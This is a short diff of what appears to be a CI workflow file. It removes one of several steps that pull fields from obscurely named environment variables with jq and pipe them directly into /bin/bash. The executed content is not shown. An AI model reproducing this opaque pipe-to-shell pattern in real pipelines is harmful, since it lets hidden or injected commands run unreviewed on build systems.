@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$ymrer9008" | jq -r .yynow3620 | /bin/bash
           printf '%s' "$lk4149" | jq -r .ie76321 | /bin/bash
           printf '%s' "$nzq2351" | jq -r .q09 | /bin/bash
-          echo $soeu12 | jq -r .q91068 | /bin/bash
 
       - name: Persist results
         if: always()
